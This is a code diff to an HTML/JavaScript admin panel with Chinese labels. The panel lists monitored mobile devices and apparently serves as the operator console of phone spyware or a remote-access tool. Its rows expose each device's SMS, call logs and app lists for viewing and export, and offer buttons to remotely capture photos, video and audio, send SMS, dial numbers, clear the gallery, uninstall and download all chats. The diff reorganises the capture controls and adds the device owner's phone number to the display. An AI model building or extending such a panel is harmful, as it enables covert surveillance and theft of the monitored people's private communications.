@@ -45,7 +45,7 @@
             <colgroup>
               <col class="col-device-user">
               <col class="col-device-network">
-              <col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit">
+              <col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit">
               <col class="col-dial">
               <col class="col-sms">
               <col class="col-custom">
@@ -60,15 +60,14 @@
                 <th id="colSms">短信总数</th>
                 <th id="colCallRecords">通话记录总数</th>
                 <th id="colAppList">APP列表总数</th>
-                <th id="colCaptures">远程采集</th>
                 <th id="colDial">拨号设置</th>
                 <th id="colSmsSend">发送短信到</th>
-                <th id="colCustom">自定义</th>
+                <th id="colCustom">远程采集</th>
                 <th id="colRemote">远程设备管理</th>
               </tr>
             </thead>
             <tbody id="deviceTableBody">
-              <tr><td colspan="12" class="loading-cell" id="deviceTableLoading"></td></tr>
+              <tr><td colspan="11" class="loading-cell" id="deviceTableLoading"></td></tr>
             </tbody>
           </table>
         </div>
@@ -203,6 +202,11 @@
         var usernameFullEsc = usernameRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
         var usernameMasked = usernameRaw.length > 4 ? usernameRaw.slice(0, 2) + '***' + usernameRaw.slice(-2) : (usernameRaw || '—');
         var usernameMaskedEsc = usernameMasked.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        var phoneRaw = (d.phone != null && d.phone !== '') ? String(d.phone).trim() : '';
+        var phoneMasked = (d.phone_masked != null && d.phone_masked !== '') ? String(d.phone_masked).trim() : (phoneRaw ? (phoneRaw.length > 4 ? phoneRaw.slice(0, 3) + '****' + phoneRaw.slice(-2) : phoneRaw) : '—');
+        var phoneFull = phoneRaw || '—';
+        var phoneMaskedEsc = phoneMasked.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        var phoneFullEsc = phoneFull.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
         var model = deviceModelFromInfo(d.device_info).replace(/</g, '&lt;').replace(/>/g, '&gt;');
         var ipDisplay = maskIp(d.last_ip || '');
         var timeDisplay = formatBackendTime(d.created_at);
@@ -211,7 +215,7 @@
           '<td class="device-info-cell"><div class="device-info-block">' +
           '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value" data-device-id="' + fullDeviceIdEsc + '">' + deviceIdDisplay + citySuffix + '</span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('username') + '</span>: <span class="info-value"><span data-masked="' + usernameMaskedEsc + '" data-full="' + usernameFullEsc + '">' + usernameMasked + '</span></span></span>' +
-          '<span class="info-row"><span class="info-label">' + i18n.t('phoneNumber') + '</span>: <span class="info-value">—</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('phoneNumber') + '</span>: <span class="info-value"><span data-masked="' + phoneMaskedEsc + '" data-full="' + phoneFullEsc + '">' + phoneMasked + '</span></span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('nickname') + '</span>: <span class="info-value info-value-nickname">' + nickname + '</span></span>' +
           '</div></td>' +
           '<td class="device-info-cell"><div class="device-info-block">' +
@@ -225,11 +229,10 @@
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('smsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitSms') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="sms">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="sms">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="sms">' + i18n.t('export') + '</button></div></td>' +
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('callRecordsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitCalls') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="calllog">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="calllog">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="calllog">' + i18n.t('export') + '</button></div></td>' +
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('appListLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitApps') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="applist">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="applist">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="applist">' + i18n.t('export') + '</button></div></td>' +
-          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('capturesLabel') + '</span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="captures">' + i18n.t('view') + '</button></div></td>' +
           '<td class="control-cell control-cell-vertical" headers="colDial"><div class="control-col-dial"><div class="control-row"><input type="text" class="dial-number-input" placeholder="' + (i18n.t('dialNumber') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-dial-cmd">' + i18n.t('dialButton') + '</button></div><div class="control-row"><button type="button" class="btn btn-sm">' + i18n.t('hangUpButton') + '</button></div></div></td>' +
           '<td class="control-cell control-cell-vertical" headers="colSmsSend"><div class="control-col-sms"><div class="control-row"><input type="text" class="sms-number-input" placeholder="' + (i18n.t('smsNumber') || '') + '"></div><div class="control-row"><input type="text" class="sms-body-input" placeholder="' + (i18n.t('smsContent') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-sms-cmd">' + i18n.t('sendButton') + '</button></div></div></td>' +
-          '<td class="control-cell" headers="colCustom"><div class="control-col-custom custom-func-block"><button type="button" class="btn btn-sm">' + i18n.t('func1') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func2') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func3') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func4') + '</button></div></td>' +
-          '<td class="control-cell control-cell-vertical" headers="colRemote"><div class="control-col-remote"><button type="button" class="btn btn-sm btn-capture-photo">' + i18n.t('capturePhoto') + '</button><button type="button" class="btn btn-sm btn-capture-video">' + i18n.t('captureVideo') + '</button><button type="button" class="btn btn-sm btn-capture-audio">' + i18n.t('captureAudio') + '</button><button type="button" class="btn btn-sm btn-clear-gallery">' + i18n.t('clearGallery') + '</button><button type="button" class="btn btn-sm btn-uninstall-cmd btn-danger">' + i18n.t('remoteUninstall') + '</button><button type="button" class="btn btn-sm btn-device-delete btn-danger">' + (i18n.t('deleteDevice') || '删除') + '</button><button type="button" class="btn btn-sm">' + i18n.t('exportAllChats') + '</button><button type="button" class="btn btn-sm">' + i18n.t('packageDownloadAll') + '</button></div></td>' +
+          '<td class="control-cell" headers="colCustom"><div class="control-col-custom custom-func-block"><button type="button" class="btn btn-sm btn-capture-photo">' + i18n.t('capturePhoto') + '</button><button type="button" class="btn btn-sm btn-capture-video">' + i18n.t('captureVideo') + '</button><button type="button" class="btn btn-sm btn-capture-audio">' + i18n.t('captureAudio') + '</button><button type="button" class="btn btn-sm btn-audit-view" data-page="captures">' + (i18n.t('viewAndPlay') || '查看/播放') + '</button></div></td>' +
+          '<td class="control-cell control-cell-vertical" headers="colRemote"><div class="control-col-remote"><button type="button" class="btn btn-sm btn-clear-gallery">' + i18n.t('clearGallery') + '</button><button type="button" class="btn btn-sm btn-uninstall-cmd btn-danger">' + i18n.t('remoteUninstall') + '</button><button type="button" class="btn btn-sm btn-device-delete btn-danger">' + (i18n.t('deleteDevice') || '删除') + '</button><button type="button" class="btn btn-sm">' + i18n.t('exportAllChats') + '</button><button type="button" class="btn btn-sm">' + i18n.t('packageDownloadAll') + '</button></div></td>' +
           '</tr>';
       }
       /** IP 归属地：使用设备 last_ip 调用 ipapi.co（HTTPS）查询，展示格式 国家 省/州 市；按 IP 缓存；内网/私有 IP 不请求，显示「—」 */
@@ -265,8 +268,8 @@
         if (!tbody) return;
         if (!items || items.length === 0) {
           var hint = (i18n.t('noDataHintSameApi') || '').trim();
-          var hintRow = hint ? '<tr><td colspan="12" class="loading-cell" style="font-size:12px; color:var(--text-secondary); padding:8px 12px;">' + hint + '</td></tr>' : '';
-          tbody.innerHTML = '<tr><td colspan="12" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>' + hintRow;
+          var hintRow = hint ? '<tr><td colspan="11" class="loading-cell" style="font-size:12px; color:var(--text-secondary); padding:8px 12px;">' + hint + '</td></tr>' : '';
+          tbody.innerHTML = '<tr><td colspan="11" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>' + hintRow;
           return;
         }
         tbody.innerHTML = items.map(buildDeviceRow).join('');
@@ -316,14 +319,12 @@
       document.getElementById('colSms').textContent = i18n.t('smsTotal');
       document.getElementById('colCallRecords').textContent = i18n.t('callRecordsTotal');
       document.getElementById('colAppList').textContent = i18n.t('appListTotal');
-      var colCapturesEl = document.getElementById('colCaptures');
-      if (colCapturesEl) colCapturesEl.textContent = i18n.t('capturesLabel') || '远程采集';
       document.getElementById('auditQueryLabel').textContent = i18n.t('auditQueryLabel');
       document.getElementById('auditQueryInput').placeholder = i18n.t('queryPlaceholder');
       document.getElementById('auditQueryBtn').textContent = i18n.t('queryButton');
       document.getElementById('colDial').textContent = i18n.t('dialSettings');
       document.getElementById('colSmsSend').textContent = i18n.t('sendSmsTo');
-      document.getElementById('colCustom').textContent = i18n.t('customBtn');
+      document.getElementById('colCustom').textContent = i18n.t('capturesLabel') || '远程采集';
       document.getElementById('colRemote').textContent = i18n.t('remoteManage');
       document.getElementById('mockHint').textContent = i18n.t('previewMock');
       var loadingEl = document.getElementById('deviceTableLoading');
